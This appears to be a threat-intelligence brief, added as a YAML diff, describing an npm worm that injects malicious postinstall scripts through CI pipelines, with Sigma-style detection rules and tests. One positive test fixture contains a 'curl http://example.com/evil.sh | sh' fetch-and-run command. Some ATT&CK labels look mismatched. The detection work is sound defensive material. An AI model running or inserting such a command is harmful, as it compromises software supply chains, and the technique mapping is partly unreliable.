@@ -1,0 +1,114 @@
+id: brief-2026-02-22-sandworm-npm-worm
+slug: 2026-02-sandworm-npm-worm
+title: SANDWORM_MODE npm Worm Hijacking CI Workflows and Poisoning AI Toolchains
+summary: An npm worm dubbed SANDWORM_MODE is actively hijacking CI workflows to poison AI toolchains by injecting malicious code into npm packages.
+severity: critical
+published_at: "2026-02-22T00:00:00Z"
+content: |
+    ## Overview
+
+    The SANDWORM_MODE npm worm represents a significant threat to the software supply chain, specifically targeting CI/CD environments. This worm spreads by injecting malicious code into npm packages during the CI build process, effectively poisoning the well for any downstream consumers of those packages. The attack focuses on compromising AI toolchains by embedding malicious code designed to manipulate or exfiltrate data from AI models and related systems. The worm's "Shai-Hulud-style" propagation suggests a self-replicating mechanism that makes it difficult to eradicate once it gains a foothold within an organization's development infrastructure. The ultimate goal appears to be the large-scale compromise of AI-driven applications and services. This attack began being tracked in February 2026 and impacts any organization utilizing affected npm packages in their CI/CD pipelines.
+
+    ## Attack Chain
+
+    1. Initial compromise of a developer workstation or CI/CD server.
+    2. Worm infects the compromised system and scans for npm projects.
+    3. The worm modifies `package.json` files to include a malicious post-install script.
+    4. During the CI build process, `npm install` executes the malicious post-install script.
+    5. The post-install script injects malicious code into the project's source code or build artifacts.
+    6. The modified package is published to the npm registry, either publicly or privately.
+    7. Downstream consumers of the infected package unknowingly incorporate the malicious code into their projects.
+    8. The malicious code executes within the consumer's environment, potentially exfiltrating data, manipulating AI models, or establishing a backdoor.
+
+    ## Impact
+
+    Successful SANDWORM_MODE infections can lead to widespread compromise of AI toolchains, impacting numerous organizations that rely on the infected npm packages. This can result in data breaches, intellectual property theft, and manipulation of AI models, potentially leading to flawed or biased outcomes. The scope of the impact depends on the popularity and usage of the infected packages, potentially affecting hundreds or thousands of organizations across various sectors. The AI poisoning aspect is particularly concerning, as it can undermine trust in AI systems and cause significant reputational damage.
+tags:
+    - npm
+    - supply-chain
+    - ci/cd
+    - worm
+    - ai-poisoning
+references:
+    - https://socket.dev/blog/sandworm-mode-npm-worm-ai-toolchain-poisoning
+    - https://www.reddit.com/r/blueteamsec/comments/1ratoso/sandworm_mode_shaihuludstyle_npm_worm_hijacks_ci/
+rules:
+    - title: Detect Suspicious npm Post-Install Script
+      description: Detects modification of package.json to include suspicious post-install scripts
+      logsource:
+        category: file_event
+        product: linux
+      detection:
+        condition: selection and not filter
+        filter:
+            Data|contains: rm -rf node_modules
+        selection:
+            Operation: modified
+            Path|endswith: package.json
+            TargetFilename|contains: package.json
+      level: high
+      tags:
+        - attack.defense_evasion
+        - attack.t1027
+      tests:
+        positive:
+            - name: package.json modified with suspicious postinstall
+              data:
+                - Data: '{"name": "test", "version": "1.0.0", "description": "", "main": "index.js", "scripts": {"test": "echo \\"Error: no test specified\\" && exit 1","postinstall": "curl http://example.com/evil.sh | sh"},"keywords": [],"author": "","license": "ISC"}'
+                  Operation: modified
+                  Path: /path/to/project/package.json
+                  TargetFilename: /path/to/project/package.json
+        negative:
+            - name: package.json modified with normal postinstall
+              data:
+                - Data: '{"name": "test", "version": "1.0.0", "description": "", "main": "index.js", "scripts": {"test": "echo \\"Error: no test specified\\" && exit 1","postinstall": "npm run build"},"keywords": [],"author": "","license": "ISC"}'
+                  Operation: modified
+                  Path: /path/to/project/package.json
+                  TargetFilename: /path/to/project/package.json
+    - title: Detect Network Connection from npm Post-Install Script
+      description: Detects network connections initiated from npm post-install scripts, which may indicate malicious activity.
+      logsource:
+        category: network_connection
+        product: linux
+      detection:
+        condition: selection
+        selection:
+            CommandLine|contains: postinstall
+            Image|endswith: /node
+            Initiated: "true"
+      level: medium
+      tags:
+        - attack.command_and_control
+        - attack.t1071.001
+      tests:
+        positive:
+            - name: Network connection from postinstall
+              data:
+                - CommandLine: /usr/bin/node /tmp/npm-install-script.js postinstall
+                  DestinationIp: 1.2.3.4
+                  DestinationPort: "80"
+                  Image: /usr/bin/node
+                  Initiated: "true"
+        negative:
+            - name: Normal npm connection
+              data:
+                - CommandLine: /usr/bin/node /usr/lib/node_modules/npm/bin/npm-cli.js install
+                  DestinationIp: 8.8.8.8
+                  DestinationPort: "53"
+                  Image: /usr/bin/node
+                  Initiated: "true"
+ttps:
+    - tactic_id: TA0001
+      tactic_name: Initial Access
+      technique_id: T1199
+      technique_name: Trusted Relationship
+    - tactic_id: TA0002
+      tactic_name: Execution
+      technique_id: T1059.004
+      technique_name: Command and Scripting Interpreter
+      subtechnique_id: T1059.004
+      subtechnique_name: JavaScript
+    - tactic_id: TA0040
+      tactic_name: Impact
+      technique_id: T1499
+      technique_name: Endpoint Denial of Service
